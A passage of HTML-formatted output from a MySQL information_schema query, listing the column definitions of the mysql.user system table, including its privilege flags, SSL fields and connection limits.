class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Process_priv           <span class="operator">|</span>               <span class="number">12</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> File_priv              <span class="operator">|</span>               <span class="number">13</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Grant_priv             <span class="operator">|</span>               <span class="number">14</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> References_priv        <span class="operator">|</span>               <span class="number">15</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Index_priv             <span class="operator">|</span>               <span class="number">16</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Alter_priv             <span class="operator">|</span>               <span class="number">17</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Show_db_priv           <span class="operator">|</span>               <span class="number">18</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Super_priv             <span class="operator">|</span>               <span class="number">19</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Create_tmp_table_priv  <span class="operator">|</span>               <span class="number">20</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Lock_tables_priv       <span class="operator">|</span>               <span class="number">21</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Execute_priv           <span class="operator">|</span>               <span class="number">22</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Repl_slave_priv        <span class="operator">|</span>               <span class="number">23</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Repl_client_priv       <span class="operator">|</span>               <span class="number">24</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Create_view_priv       <span class="operator">|</span>               <span class="number">25</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Show_view_priv         <span class="operator">|</span>               <span class="number">26</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Create_routine_priv    <span class="operator">|</span>               <span class="number">27</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Alter_routine_priv     <span class="operator">|</span>               <span class="number">28</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Create_user_priv       <span class="operator">|</span>               <span class="number">29</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Event_priv             <span class="operator">|</span>               <span class="number">30</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Trigger_priv           <span class="operator">|</span>               <span class="number">31</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Create_tablespace_priv <span class="operator">|</span>               <span class="number">32</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> ssl_type               <span class="operator">|</span>               <span class="number">33</span> <span class="operator">|</span>                       <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">9</span> <span class="operator">|</span>                     <span class="number">27</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;ANY&#x27;</span>,<span class="string">&#x27;X509&#x27;</span>,<span class="string">&#x27;SPECIFIED&#x27;</span>) <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> ssl_cipher             <span class="operator">|</span>               <span class="number">34</span> <span class="operator">|</span> <span class="keyword">NULL</span>                  <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> <span class="type">blob</span>      <span class="operator">|</span>                    <span class="number">65535</span> <span class="operator">|</span>                  <span class="number">65535</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span> <span class="keyword">NULL</span>            <span class="operator">|</span> <span class="type">blob</span>                              <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> x509_issuer            <span class="operator">|</span>               <span class="number">35</span> <span class="operator">|</span> <span class="keyword">NULL</span>                  <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> <span class="type">blob</span>      <span class="operator">|</span>                    <span class="number">65535</span> <span class="operator">|</span>                  <span class="number">65535</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span> <span class="keyword">NULL</span>            <span class="operator">|</span> <span class="type">blob</span>                              <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> x509_subject           <span class="operator">|</span>               <span class="number">36</span> <span class="operator">|</span> <span class="keyword">NULL</span>                  <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> <span class="type">blob</span>      <span class="operator">|</span>                    <span class="number">65535</span> <span class="operator">|</span>                  <span class="number">65535</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span> <span class="keyword">NULL</span>            <span class="operator">|</span> <span class="type">blob</span>                              <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> max_questions          <span class="operator">|</span>               <span class="number">37</span> <span class="operator">|</span> <span class="number">0</span>                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> <span class="type">int</span>       <span class="operator">|</span>                     <span class="keyword">NULL</span> <span class="operator">|</span>                   <span class="keyword">NULL</span> <span class="operator">|</span>                <span class="number">10</span> <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span> <span class="keyword">NULL</span>            <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) unsigned                  <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> max_updates            <span class="operator">|</span>               <span class="number">38</span> <span class="operator">|</span> <span class="number">0</span>                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> <span class="type">int</span>       <span class="operator">|</span>                     <span class="keyword">NULL</span> <span class="operator">|</span>                   <span class="keyword">NULL</span> <span class="operator">|</span>                <span class="number">10</span> <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span> <span class="keyword">NULL</span>            <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) unsigned                  <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> max_connections        <span class="operator">|</span>               <span class="number">39</span> <span class="operator">|</span> <span class="number">0</span>                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> <span class="type">int</span>       <span class="operator">|</span>                     <span class="keyword">NULL</span> <span class="operator">|</span>                   <span class="keyword">NULL</span> <span class="operator">|</span>                <span class="number">10</span> <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span> <span class="keyword">NULL</span>            <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) unsigned                  <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> max_user_connections   <span class="operator">|</span>               <span class="number">40</span> <span class="operator">|</span> <span class="number">0</span>                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> <span class="type">int</span>       <span class="operator">|</span>                     <span class="keyword">NULL</span> <span class="operator">|</span>                   <span class="keyword">NULL</span> <span class="operator">|</span>                <span class="number">10</span> <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span> <span class="keyword">NULL</span>            <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) unsigned                  <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> plugin                 <span class="operator">|</span>               <span class="number">41</span> <span class="operator">|</span> mysql_native_password <span class="operator">|</span> YES         <span class="operator">|</span> <span class="type">char</span>      <span class="operator">|</span>                       <span class="number">64</span> <span class="operator">|</span>                    <span class="number">192</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_bin        <span class="operator">|</span> <span class="type">char</span>(<span class="number">64</span>)                          <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> authentication_string  